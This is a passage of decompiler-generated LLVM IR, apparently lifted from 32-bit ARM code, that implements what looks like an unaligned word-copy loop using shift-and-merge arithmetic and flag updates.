  %v3_16c0c = load i32, i32* @r4, align 4
  store i32 %v3_16c0c, i32* %stack_var_-16, align 4
  %v6_16c0c = load i32, i32* @r5, align 4
  store i32 %v6_16c0c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16c10

dec_label_pc_16c10:                               ; preds = %dec_label_pc_16c10.dec_label_pc_16c10_crit_edge, %dec_label_pc_16c08
  %v0_16c34 = phi i32 [ %v12_16c34, %dec_label_pc_16c10.dec_label_pc_16c10_crit_edge ], [ %v0_16d0c75, %dec_label_pc_16c08 ]
  %v0_16c14 = phi i32 [ %v0_16c14.pre, %dec_label_pc_16c10.dec_label_pc_16c10_crit_edge ], [ %v4_16bf0, %dec_label_pc_16c08 ]
  %v0_16c10 = phi i32 [ %v0_16c10.pre, %dec_label_pc_16c10.dec_label_pc_16c10_crit_edge ], [ %v2_16bf0, %dec_label_pc_16c08 ]
  %v3_16c10 = udiv i32 %v0_16c10, 256
  %v1_16c14 = inttoptr i32 %v0_16c14 to i32*
  %v2_16c14 = load i32, i32* %v1_16c14, align 4
  store i32 %v2_16c14, i32* %r4.global-to-local, align 4
  %v3_16c14 = add i32 %v0_16c14, 4
  %v4_16c14 = inttoptr i32 %v3_16c14 to i32*
  %v5_16c14 = load i32, i32* %v4_16c14, align 4
  store i32 %v5_16c14, i32* %r5.global-to-local, align 4
  %v6_16c14 = add i32 %v0_16c14, 8
  %v7_16c14 = inttoptr i32 %v6_16c14 to i32*
  %v8_16c14 = load i32, i32* %v7_16c14, align 4
  store i32 %v8_16c14, i32* %ip.global-to-local, align 4
  %v9_16c14 = add i32 %v0_16c14, 12
  %v10_16c14 = inttoptr i32 %v9_16c14 to i32*
  %v11_16c14 = load i32, i32* %v10_16c14, align 4
  store i32 %v11_16c14, i32* %lr.global-to-local, align 4
  %v12_16c14 = add i32 %v0_16c14, 16
  store i32 %v12_16c14, i32* %r1.global-to-local, align 4
  %v4_16c18 = mul i32 %v2_16c14, 16777216
  %v5_16c18 = or i32 %v4_16c18, %v3_16c10
  store i32 %v5_16c18, i32* @r3, align 4
  %v3_16c1c = udiv i32 %v2_16c14, 256
  %v4_16c20 = mul i32 %v5_16c14, 16777216
  %v5_16c20 = or i32 %v4_16c20, %v3_16c1c
  store i32 %v5_16c20, i32* %r4.global-to-local, align 4
  %v3_16c24 = udiv i32 %v5_16c14, 256
  %v4_16c28 = mul i32 %v8_16c14, 16777216
  %v5_16c28 = or i32 %v4_16c28, %v3_16c24
  store i32 %v5_16c28, i32* %r5.global-to-local, align 4
  %v3_16c2c = udiv i32 %v8_16c14, 256
  %v4_16c30 = mul i32 %v11_16c14, 16777216
  %v5_16c30 = or i32 %v4_16c30, %v3_16c2c
  store i32 %v5_16c30, i32* @ip, align 4
  %v1_16c34 = inttoptr i32 %v0_16c34 to i32*
  store i32 %v5_16c18, i32* %v1_16c34, align 4
  %v3_16c34 = add i32 %v0_16c34, 4
  %v4_16c34 = inttoptr i32 %v3_16c34 to i32*
  %v5_16c34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16c34, i32* %v4_16c34, align 4
  %v6_16c34 = add i32 %v0_16c34, 8
  %v7_16c34 = inttoptr i32 %v6_16c34 to i32*
  %v8_16c34 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16c34, i32* %v7_16c34, align 4
  %v9_16c34 = add i32 %v0_16c34, 12
  %v10_16c34 = inttoptr i32 %v9_16c34 to i32*
  %v11_16c34 = load i32, i32* @ip, align 4
  store i32 %v11_16c34, i32* %v10_16c34, align 4
  %v12_16c34 = add i32 %v0_16c34, 16
  store i32 %v12_16c34, i32* %r0.global-to-local, align 4
  %v0_16c38 = load i32, i32* %r2.global-to-local, align 4
  %v1_16c38 = add i32 %v0_16c38, -16
  store i32 %v1_16c38, i32* %r2.global-to-local, align 4
  %v3_16c38 = sub i32 15, %v0_16c38
  %v4_16c38 = and i32 %v3_16c38, %v0_16c38
  %v5_16c38 = icmp slt i32 %v4_16c38, 0
  %v6_16c38 = icmp slt i32 %v1_16c38, 0
  %v2_16c3c = xor i1 %v6_16c38, %v5_16c38
  br i1 %v2_16c3c, label %dec_label_pc_16c40, label %dec_label_pc_16c10.dec_label_pc_16c10_crit_edge

dec_label_pc_16c10.dec_label_pc_16c10_crit_edge:  ; preds = %dec_label_pc_16c10
  %v0_16c10.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16c14.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16c10

dec_label_pc_16c40:                               ; preds = %dec_label_pc_16c10
  %v2_16c40 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16c40, i32* @r4, align 4
  %v5_16c40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16c40, i32* @r5, align 4
  %v1_16c44 = add i32 %v0_16c38, -4
  store i32 %v1_16c44, i32* %r2.global-to-local, align 4
  %v3_16c44 = add i32 %v0_16c38, 2147483632
  %v4_16c44 = and i32 %v1_16c44, %v3_16c44
  %v5_16c44 = icmp slt i32 %v4_16c44, 0
  store i1 %v5_16c44, i1* %cpsr_v.global-to-local, align 1
  %v6_16c44 = icmp slt i32 %v1_16c44, 0
  store i1 %v6_16c44, i1* %cpsr_n.global-to-local, align 1
  %v7_16c44 = icmp eq i32 %v1_16c44, 0
  store i1 %v7_16c44, i1* %cpsr_z.global-to-local, align 1
  %v2_16c48 = xor i1 %v6_16c44, %v5_16c44
  br i1 %v2_16c48, label %dec_label_pc_16c64, label %dec_label_pc_16c4c

dec_label_pc_16c4c:                               ; preds = %dec_label_pc_16c40, %dec_label_pc_16c00, %dec_label_pc_16c4c
  %v1_16c58 = phi i32 [ %v4_16c58, %dec_label_pc_16c4c ], [ %v12_16c34, %dec_label_pc_16c40 ], [ %v0_16d0c75, %dec_label_pc_16c00 ]
  %v0_16c4c = load i32, i32* %lr.global-to-local, align 4
  %v3_16c4c = udiv i32 %v0_16c4c, 256
  store i32 %v3_16c4c, i32* %ip.global-to-local, align 4
  %v0_16c50 = load i32, i32* %r1.global-to-local, align 4
  %v1_16c50 = inttoptr i32 %v0_16c50 to i32*
  %v2_16c50 = load i32, i32* %v1_16c50, align 4
  store i32 %v2_16c50, i32* %lr.global-to-local, align 4
  %v4_16c50 = add i32 %v0_16c50, 4
  store i32 %v4_16c50, i32* %r1.global-to-local, align 4
  %v4_16c54 = mul i32 %v2_16c50, 16777216
  %v5_16c54 = or i32 %v4_16c54, %v3_16c4c
  store i32 %v5_16c54, i32* @ip, align 4
  %v2_16c58 = inttoptr i32 %v1_16c58 to i32*
  store i32 %v5_16c54, i32* %v2_16c58, align 4
  %v3_16c58 = load i32, i32* %r0.global-to-local, align 4
  %v4_16c58 = add i32 %v3_16c58, 4
  store i32 %v4_16c58, i32* %r0.global-to-local, align 4
  %v0_16c5c = load i32, i32* %r2.global-to-local, align 4
  %v1_16c5c = add i32 %v0_16c5c, -4
  store i32 %v1_16c5c, i32* %r2.global-to-local, align 4
  %v3_16c5c = sub i32 3, %v0_16c5c
  %v4_16c5c = and i32 %v3_16c5c, %v0_16c5c
  %v5_16c5c = icmp slt i32 %v4_16c5c, 0
  %v6_16c5c = icmp slt i32 %v1_16c5c, 0
  %v2_16c60 = xor i1 %v6_16c5c, %v5_16c5c
  br i1 %v2_16c60, label %dec_label_pc_16c64.loopexit, label %dec_label_pc_16c4c

dec_label_pc_16c64.loopexit:                      ; preds = %dec_label_pc_16c4c
  %v7_16c5c = icmp eq i32 %v0_16c5c, 4
  store i1 %v5_16c5c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16c5c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16c5c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16c64

dec_label_pc_16c64:                               ; preds = %dec_label_pc_16c64.loopexit, %dec_label_pc_16c40
  %v0_16b8c58 = phi i32 [ %v1_16c5c, %dec_label_pc_16c64.loopexit ], [ %v1_16c44, %dec_label_pc_16c40 ]
  %v0_16c64 = load i32, i32* %r1.global-to-local, align 4
  %v1_16c64 = add i32 %v0_16c64, -3
  store i32 %v1_16c64, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_16c6c:                               ; preds = %dec_label_pc_16bec
  br i1 %v2_16c70, label %dec_label_pc_16cb8, label %dec_label_pc_16c74

dec_label_pc_16c74:                               ; preds = %dec_label_pc_16c6c
  store i32 %v1_16c6c, i32* %r2.global-to-local, align 4
  %v3_16c78 = load i32, i32* @r4, align 4
  store i32 %v3_16c78, i32* %stack_var_-16, align 4
  %v6_16c78 = load i32, i32* @r5, align 4
  store i32 %v6_16c78, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16c7c

dec_label_pc_16c7c:                               ; preds = %dec_label_pc_16c7c.dec_label_pc_16c7c_crit_edge, %dec_label_pc_16c74
  %v0_16ca0 = phi i32 [ %v12_16ca0, %dec_label_pc_16c7c.dec_label_pc_16c7c_crit_edge ], [ %v0_16d0c75, %dec_label_pc_16c74 ]
  %v0_16c80 = phi i32 [ %v0_16c80.pre, %dec_label_pc_16c7c.dec_label_pc_16c7c_crit_edge ], [ %v4_16bf0, %dec_label_pc_16c74 ]
  %v0_16c7c = phi i32 [ %v0_16c7c.pre, %dec_label_pc_16c7c.dec_label_pc_16c7c_crit_edge ], [ %v2_16bf0, %dec_label_pc_16c74 ]
  %v3_16c7c = udiv i32 %v0_16c7c, 65536
  %v1_16c80 = inttoptr i32 %v0_16c80 to i32*
  %v2_16c80 = load i32, i32* %v1_16c80, align 4
  store i32 %v2_16c80, i32* %r4.global-to-local, align 4
  %v3_16c80 = add i32 %v0_16c80, 4
  %v4_16c80 = inttoptr i32 %v3_16c80 to i32*
  %v5_16c80 = load i32, i32* %v4_16c80, align 4
  store i32 %v5_16c80, i32* %r5.global-to-local, align 4
  %v6_16c80 = add i32 %v0_16c80, 8
  %v7_16c80 = inttoptr i32 %v6_16c80 to i32*
  %v8_16c80 = load i32, i32* %v7_16c80, align 4
  store i32 %v8_16c80, i32* %ip.global-to-local, align 4
  %v9_16c80 = add i32 %v0_16c80, 12
  %v10_16c80 = inttoptr i32 %v9_16c80 to i32*
  %v11_16c80 = load i32, i32* %v10_16c80, align 4
  store i32 %v11_16c80, i32* %lr.global-to-local, align 4
  %v12_16c80 = add i32 %v0_16c80, 16
  store i32 %v12_16c80, i32* %r1.global-to-local, align 4
  %v4_16c84 = mul i32 %v2_16c80, 65536
  %v5_16c84 = or i32 %v4_16c84, %v3_16c7c
  store i32 %v5_16c84, i32* @r3, align 4
  %v3_16c88 = udiv i32 %v2_16c80, 65536
  %v4_16c8c = mul i32 %v5_16c80, 65536
  %v5_16c8c = or i32 %v4_16c8c, %v3_16c88
  store i32 %v5_16c8c, i32* %r4.global-to-local, align 4
  %v3_16c90 = udiv i32 %v5_16c80, 65536
  %v4_16c94 = mul i32 %v8_16c80, 65536
  %v5_16c94 = or i32 %v4_16c94, %v3_16c90
  store i32 %v5_16c94, i32* %r5.global-to-local, align 4
  %v3_16c98 = udiv i32 %v8_16c80, 65536
  %v4_16c9c = mul i32 %v11_16c80, 65536
  %v5_16c9c = or i32 %v4_16c9c, %v3_16c98
  store i32 %v5_16c9c, i32* @ip, align 4
  %v1_16ca0 = inttoptr i32 %v0_16ca0 to i32*
  store i32 %v5_16c84, i32* %v1_16ca0, align 4
  %v3_16ca0 = add i32 %v0_16ca0, 4
  %v4_16ca0 = inttoptr i32 %v3_16ca0 to i32*
  %v5_16ca0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16ca0, i32* %v4_16ca0, align 4
  %v6_16ca0 = add i32 %v0_16ca0, 8
  %v7_16ca0 = inttoptr i32 %v6_16ca0 to i32*
  %v8_16ca0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16ca0, i32* %v7_16ca0, align 4
  %v9_16ca0 = add i32 %v0_16ca0, 12
  %v10_16ca0 = inttoptr i32 %v9_16ca0 to i32*
  %v11_16ca0 = load i32, i32* @ip, align 4
  store i32 %v11_16ca0, i32* %v10_16ca0, align 4
  %v12_16ca0 = add i32 %v0_16ca0, 16
  store i32 %v12_16ca0, i32* %r0.global-to-local, align 4
  %v0_16ca4 = load i32, i32* %r2.global-to-local, align 4
  %v1_16ca4 = add i32 %v0_16ca4, -16
  store i32 %v1_16ca4, i32* %r2.global-to-local, align 4
  %v3_16ca4 = sub i32 15, %v0_16ca4
  %v4_16ca4 = and i32 %v3_16ca4, %v0_16ca4
  %v5_16ca4 = icmp slt i32 %v4_16ca4, 0
  %v6_16ca4 = icmp slt i32 %v1_16ca4, 0
  %v2_16ca8 = xor i1 %v6_16ca4, %v5_16ca4
  br i1 %v2_16ca8, label %dec_label_pc_16cac, label %dec_label_pc_16c7c.dec_label_pc_16c7c_crit_edge

dec_label_pc_16c7c.dec_label_pc_16c7c_crit_edge:  ; preds = %dec_label_pc_16c7c
  %v0_16c7c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16c80.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16c7c

dec_label_pc_16cac:                               ; preds = %dec_label_pc_16c7c
  %v2_16cac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16cac, i32* @r4, align 4
  %v5_16cac = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16cac, i32* @r5, align 4
  %v1_16cb0 = add i32 %v0_16ca4, -4
  store i32 %v1_16cb0, i32* %r2.global-to-local, align 4
  %v3_16cb0 = add i32 %v0_16ca4, 2147483632
  %v4_16cb0 = and i32 %v1_16cb0, %v3_16cb0
  %v5_16cb0 = icmp slt i32 %v4_16cb0, 0
  store i1 %v5_16cb0, i1* %cpsr_v.global-to-local, align 1
  %v6_16cb0 = icmp slt i32 %v1_16cb0, 0
  store i1 %v6_16cb0, i1* %cpsr_n.global-to-local, align 1
  %v7_16cb0 = icmp eq i32 %v1_16cb0, 0
  store i1 %v7_16cb0, i1* %cpsr_z.global-to-local, align 1
  %v2_16cb4 = xor i1 %v6_16cb0, %v5_16cb0
  br i1 %v2_16cb4, label %dec_label_pc_16cd0, label %dec_label_pc_16cb8

dec_label_pc_16cb8:                               ; preds = %dec_label_pc_16cac, %dec_label_pc_16c6c, %dec_label_pc_16cb8
  %v1_16cc4 = phi i32 [ %v4_16cc4, %dec_label_pc_16cb8 ], [ %v12_16ca0, %dec_label_pc_16cac ], [ %v0_16d0c75, %dec_label_pc_16c6c ]
  %v0_16cb8 = load i32, i32* %lr.global-to-local, align 4
  %v3_16cb8 = udiv i32 %v0_16cb8, 65536
  store i32 %v3_16cb8, i32* %ip.global-to-local, align 4
  %v0_16cbc = load i32, i32* %r1.global-to-local, align 4
  %v1_16cbc = inttoptr i32 %v0_16cbc to i32*
  %v2_16cbc = load i32, i32* %v1_16cbc, align 4
  store i32 %v2_16cbc, i32* %lr.global-to-local, align 4
  %v4_16cbc = add i32 %v0_16cbc, 4
  store i32 %v4_16cbc, i32* %r1.global-to-local, align 4
  %v4_16cc0 = mul i32 %v2_16cbc, 65536
  %v5_16cc0 = or i32 %v4_16cc0, %v3_16cb8
  store i32 %v5_16cc0, i32* @ip, align 4
  %v2_16cc4 = inttoptr i32 %v1_16cc4 to i32*
  store i32 %v5_16cc0, i32* %v2_16cc4, align 4
  %v3_16cc4 = load i32, i32* %r0.global-to-local, align 4
  %v4_16cc4 = add i32 %v3_16cc4, 4
  store i32 %v4_16cc4, i32* %r0.global-to-local, align 4
  %v0_16cc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16cc8 = add i32 %v0_16cc8, -4
  store i32 %v1_16cc8, i32* %r2.global-to-local, align 4
  %v3_16cc8 = sub i32 3, %v0_16cc8
  %v4_16cc8 = and i32 %v3_16cc8, %v0_16cc8
  %v5_16cc8 = icmp slt i32 %v4_16cc8, 0
  %v6_16cc8 = icmp slt i32 %v1_16cc8, 0
  %v2_16ccc = xor i1 %v6_16cc8, %v5_16cc8
  br i1 %v2_16ccc, label %dec_label_pc_16cd0.loopexit, label %dec_label_pc_16cb8

dec_label_pc_16cd0.loopexit:                      ; preds = %dec_label_pc_16cb8
  %v7_16cc8 = icmp eq i32 %v0_16cc8, 4
  store i1 %v5_16cc8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16cc8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16cc8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16cd0

dec_label_pc_16cd0:                               ; preds = %dec_label_pc_16cd0.loopexit, %dec_label_pc_16cac
  %v0_16b8c59 = phi i32 [ %v1_16cc8, %dec_label_pc_16cd0.loopexit ], [ %v1_16cb0, %dec_label_pc_16cac ]
  %v0_16cd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16cd0 = add i32 %v0_16cd0, -2
  store i32 %v1_16cd0, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_16cd8:                               ; preds = %dec_label_pc_16bec
  br i1 %v2_16c70, label %dec_label_pc_16d24, label %dec_label_pc_16ce0

dec_label_pc_16ce0:                               ; preds = %dec_label_pc_16cd8
  store i32 %v1_16c6c, i32* %r2.global-to-local, align 4
  %v3_16ce4 = load i32, i32* @r4, align 4
  store i32 %v3_16ce4, i32* %stack_var_-16, align 4
  %v6_16ce4 = load i32, i32* @r5, align 4
  store i32 %v6_16ce4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16ce8

dec_label_pc_16ce8:                               ; preds = %dec_label_pc_16ce8.dec_label_pc_16ce8_crit_edge, %dec_label_pc_16ce0
  %v0_16d0c = phi i32 [ %v12_16d0c, %dec_label_pc_16ce8.dec_label_pc_16ce8_crit_edge ], [ %v0_16d0c75, %dec_label_pc_16ce0 ]
  %v0_16cec = phi i32 [ %v0_16cec.pre, %dec_label_pc_16ce8.dec_label_pc_16ce8_crit_edge ], [ %v4_16bf0, %dec_label_pc_16ce0 ]
  %v0_16ce8 = phi i32 [ %v0_16ce8.pre, %dec_label_pc_16ce8.dec_label_pc_16ce8_crit_edge ], [ %v2_16bf0, %dec_label_pc_16ce0 ]
  %v3_16ce8 = udiv i32 %v0_16ce8, 16777216
  %v1_16cec = inttoptr i32 %v0_16cec to i32*
  %v2_16cec = load i32, i32* %v1_16cec, align 4
  store i32 %v2_16cec, i32* %r4.global-to-local, align 4
  %v3_16cec = add i32 %v0_16cec, 4
  %v4_16cec = inttoptr i32 %v3_16cec to i32*
  %v5_16cec = load i32, i32* %v4_16cec, align 4
  store i32 %v5_16cec, i32* %r5.global-to-local, align 4
  %v6_16cec = add i32 %v0_16cec, 8
  %v7_16cec = inttoptr i32 %v6_16cec to i32*
  %v8_16cec = load i32, i32* %v7_16cec, align 4
  store i32 %v8_16cec, i32* %ip.global-to-local, align 4
  %v9_16cec = add i32 %v0_16cec, 12
  %v10_16cec = inttoptr i32 %v9_16cec to i32*
  %v11_16cec = load i32, i32* %v10_16cec, align 4
  store i32 %v11_16cec, i32* %lr.global-to-local, align 4
  %v12_16cec = add i32 %v0_16cec, 16
  store i32 %v12_16cec, i32* %r1.global-to-local, align 4
  %v4_16cf0 = mul i32 %v2_16cec, 256
  %v5_16cf0 = or i32 %v4_16cf0, %v3_16ce8
  store i32 %v5_16cf0, i32* @r3, align 4
  %v3_16cf4 = udiv i32 %v2_16cec, 16777216
  %v4_16cf8 = mul i32 %v5_16cec, 256
  %v5_16cf8 = or i32 %v4_16cf8, %v3_16cf4
  store i32 %v5_16cf8, i32* %r4.global-to-local, align 4
  %v3_16cfc = udiv i32 %v5_16cec, 16777216
  %v4_16d00 = mul i32 %v8_16cec, 256
  %v5_16d00 = or i32 %v4_16d00, %v3_16cfc
  store i32 %v5_16d00, i32* %r5.global-to-local, align 4
  %v3_16d04 = udiv i32 %v8_16cec, 16777216
  %v4_16d08 = mul i32 %v11_16cec, 256
  %v5_16d08 = or i32 %v4_16d08, %v3_16d04
  store i32 %v5_16d08, i32* @ip, align 4
  %v1_16d0c = inttoptr i32 %v0_16d0c to i32*
  store i32 %v5_16cf0, i32* %v1_16d0c, align 4
  %v3_16d0c = add i32 %v0_16d0c, 4
  %v4_16d0c = inttoptr i32 %v3_16d0c to i32*
  %v5_16d0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16d0c, i32* %v4_16d0c, align 4
  %v6_16d0c = add i32 %v0_16d0c, 8
  %v7_16d0c = inttoptr i32 %v6_16d0c to i32*
  %v8_16d0c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16d0c, i32* %v7_16d0c, align 4
  %v9_16d0c = add i32 %v0_16d0c, 12
  %v10_16d0c = inttoptr i32 %v9_16d0c to i32*
  %v11_16d0c = load i32, i32* @ip, align 4
  store i32 %v11_16d0c, i32* %v10_16d0c, align 4
  %v12_16d0c = add i32 %v0_16d0c, 16
  store i32 %v12_16d0c, i32* %r0.global-to-local, align 4
  %v0_16d10 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d10 = add i32 %v0_16d10, -16
  store i32 %v1_16d10, i32* %r2.global-to-local, align 4
  %v3_16d10 = sub i32 15, %v0_16d10
  %v4_16d10 = and i32 %v3_16d10, %v0_16d10
  %v5_16d10 = icmp slt i32 %v4_16d10, 0
  %v6_16d10 = icmp slt i32 %v1_16d10, 0
  %v2_16d14 = xor i1 %v6_16d10, %v5_16d10
  br i1 %v2_16d14, label %dec_label_pc_16d18, label %dec_label_pc_16ce8.dec_label_pc_16ce8_crit_edge

dec_label_pc_16ce8.dec_label_pc_16ce8_crit_edge:  ; preds = %dec_label_pc_16ce8
  %v0_16ce8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16cec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16ce8

dec_label_pc_16d18:                               ; preds = %dec_label_pc_16ce8
  %v2_16d18 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16d18, i32* @r4, align 4
  %v5_16d18 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16d18, i32* @r5, align 4
  %v1_16d1c = add i32 %v0_16d10, -4
  store i32 %v1_16d1c, i32* %r2.global-to-local, align 4
  %v3_16d1c = add i32 %v0_16d10, 2147483632
  %v4_16d1c = and i32 %v1_16d1c, %v3_16d1c
  %v5_16d1c = icmp slt i32 %v4_16d1c, 0
  store i1 %v5_16d1c, i1* %cpsr_v.global-to-local, align 1
  %v6_16d1c = icmp slt i32 %v1_16d1c, 0
  store i1 %v6_16d1c, i1* %cpsr_n.global-to-local, align 1
  %v7_16d1c = icmp eq i32 %v1_16d1c, 0
  store i1 %v7_16d1c, i1* %cpsr_z.global-to-local, align 1
  %v2_16d20 = xor i1 %v6_16d1c, %v5_16d1c
  br i1 %v2_16d20, label %dec_label_pc_16d3c, label %dec_label_pc_16d24

dec_label_pc_16d24:                               ; preds = %dec_label_pc_16d18, %dec_label_pc_16cd8, %dec_label_pc_16d24
  %v1_16d30 = phi i32 [ %v4_16d30, %dec_label_pc_16d24 ], [ %v12_16d0c, %dec_label_pc_16d18 ], [ %v0_16d0c75, %dec_label_pc_16cd8 ]
  %v0_16d24 = load i32, i32* %lr.global-to-local, align 4
  %v3_16d24 = udiv i32 %v0_16d24, 16777216
  store i32 %v3_16d24, i32* %ip.global-to-local, align 4
  %v0_16d28 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d28 = inttoptr i32 %v0_16d28 to i32*
  %v2_16d28 = load i32, i32* %v1_16d28, align 4
  store i32 %v2_16d28, i32* %lr.global-to-local, align 4
  %v4_16d28 = add i32 %v0_16d28, 4
  store i32 %v4_16d28, i32* %r1.global-to-local, align 4
  %v4_16d2c = mul i32 %v2_16d28, 256
  %v5_16d2c = or i32 %v4_16d2c, %v3_16d24
  store i32 %v5_16d2c, i32* @ip, align 4
  %v2_16d30 = inttoptr i32 %v1_16d30 to i32*
  store i32 %v5_16d2c, i32* %v2_16d30, align 4
  %v3_16d30 = load i32, i32* %r0.global-to-local, align 4
  %v4_16d30 = add i32 %v3_16d30, 4
  store i32 %v4_16d30, i32* %r0.global-to-local, align 4
  %v0_16d34 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d34 = add i32 %v0_16d34, -4
  store i32 %v1_16d34, i32* %r2.global-to-local, align 4
  %v3_16d34 = sub i32 3, %v0_16d34
  %v4_16d34 = and i32 %v3_16d34, %v0_16d34
  %v5_16d34 = icmp slt i32 %v4_16d34, 0
  %v6_16d34 = icmp slt i32 %v1_16d34, 0
  %v2_16d38 = xor i1 %v6_16d34, %v5_16d34
  br i1 %v2_16d38, label %dec_label_pc_16d3c.loopexit, label %dec_label_pc_16d24

dec_label_pc_16d3c.loopexit:                      ; preds = %dec_label_pc_16d24
  %v7_16d34 = icmp eq i32 %v0_16d34, 4
  store i1 %v5_16d34, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16d34, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16d34, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16d3c

dec_label_pc_16d3c:                               ; preds = %dec_label_pc_16d3c.loopexit, %dec_label_pc_16d18
  %v0_16b8c60 = phi i32 [ %v1_16d34, %dec_label_pc_16d3c.loopexit ], [ %v1_16d1c, %dec_label_pc_16d18 ]
  %v0_16d3c = load i32, i32* %r1.global-to-local, align 4
  %v1_16d3c = add i32 %v0_16d3c, -1
  store i32 %v1_16d3c, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_16d44:                               ; preds = %entry
  %v1_16d44 = load i32, i32* @r2, align 4
  %v2_16d44 = add i32 %v1_16d44, %v0_16af0
  store i32 %v2_16d44, i32* %r1.global-to-local, align 4
  %v2_16d48 = add i32 %v1_16d44, %v1_16af0
  store i32 %v2_16d48, i32* %r0.global-to-local, align 4
  %v2_16d4c = add i32 %v1_16d44, -4
  store i32 %v2_16d4c, i32* %r2.global-to-local, align 4
  %v4_16d4c = sub i32 3, %v1_16d44
  %v5_16d4c = and i32 %v4_16d4c, %v1_16d44
  %v6_16d4c = icmp slt i32 %v5_16d4c, 0
  store i1 %v6_16d4c, i1* %cpsr_v.global-to-local, align 1
  %v7_16d4c = icmp slt i32 %v2_16d4c, 0
  store i1 %v7_16d4c, i1* %cpsr_n.global-to-local, align 1
  %v8_16d4c = icmp eq i32 %v1_16d44, 4
  store i1 %v8_16d4c, i1* %cpsr_z.global-to-local, align 1
  %v5_16d50 = icmp slt i32 %v1_16d44, 4
  br i1 %v5_16d50, label %bb150, label %dec_label_pc_16d54

dec_label_pc_16d54:                               ; preds = %dec_label_pc_16d44
  %v1_16d54 = urem i32 %v2_16d48, 4
  store i32 %v1_16d54, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16d54 = icmp eq i32 %v1_16d54, 0
  store i1 %v2_16d54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16d54, label %dec_label_pc_16d5c, label %dec_label_pc_16dfc

dec_label_pc_16d5c:                               ; preds = %dec_label_pc_16d54
  %v1_16d5c = urem i32 %v2_16d44, 4
  store i32 %v1_16d5c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16d5c = icmp eq i32 %v1_16d5c, 0
  store i1 %v2_16d5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16d5c, label %dec_label_pc_16d64, label %dec_label_pc_16e28

dec_label_pc_16d64:                               ; preds = %dec_label_pc_16d5c, %dec_label_pc_16e20
  %v0_16d7c36 = phi i32 [ %v2_16d48, %dec_label_pc_16d5c ], [ %v0_16e7019, %dec_label_pc_16e20 ]
  %v0_16d7835 = phi i32 [ %v2_16d44, %dec_label_pc_16d5c ], [ %v0_16e20, %dec_label_pc_16e20 ]
  %v0_16d64 = phi i32 [ %v2_16d4c, %dec_label_pc_16d5c ], [ %v2_16e18, %dec_label_pc_16e20 ]
  %v2_16d64 = add i32 %v0_16d64, -8
  store i32 %v2_16d64, i32* %r2.global-to-local, align 4
  %v4_16d64 = sub i32 7, %v0_16d64
  %v5_16d64 = and i32 %v4_16d64, %v0_16d64
  %v6_16d64 = icmp slt i32 %v5_16d64, 0
  store i1 %v6_16d64, i1* %cpsr_v.global-to-local, align 1
  %v7_16d64 = icmp slt i32 %v2_16d64, 0
  store i1 %v7_16d64, i1* %cpsr_n.global-to-local, align 1
  %v8_16d64 = icmp eq i32 %v0_16d64, 8
  store i1 %v8_16d64, i1* %cpsr_z.global-to-local, align 1
  %v5_16d68 = icmp slt i32 %v0_16d64, 8
  br i1 %v5_16d68, label %dec_label_pc_16db4, label %dec_label_pc_16d6c

dec_label_pc_16d6c:                               ; preds = %dec_label_pc_16d64
  %v3_16d6c = load i32, i32* @r4, align 4
  %v5_16d6c = inttoptr i32 %v3_16d6c to i8*
  store i8* %v5_16d6c, i8** %stack_var_-8, align 4
  %v8_16d6c = load i32, i32* @lr, align 4
  %v2_16d70 = add i32 %v0_16d64, -28
  store i32 %v2_16d70, i32* %r2.global-to-local, align 4
  %v4_16d70 = sub i32 27, %v0_16d64
  %v5_16d70 = and i32 %v4_16d70, %v2_16d64
  %v6_16d70 = icmp slt i32 %v5_16d70, 0
  store i1 %v6_16d70, i1* %cpsr_v.global-to-local, align 1
  %v7_16d70 = icmp slt i32 %v2_16d70, 0
  store i1 %v7_16d70, i1* %cpsr_n.global-to-local, align 1
  %v8_16d70 = icmp eq i32 %v2_16d64, 20
  store i1 %v8_16d70, i1* %cpsr_z.global-to-local, align 1
  %v5_16d74 = icmp slt i32 %v2_16d64, 20
  br i1 %v5_16d74, label %dec_label_pc_16d90, label %dec_label_pc_16d78

dec_label_pc_16d78:                               ; preds = %dec_label_pc_16d6c, %dec_label_pc_16d78.dec_label_pc_16d78_crit_edge
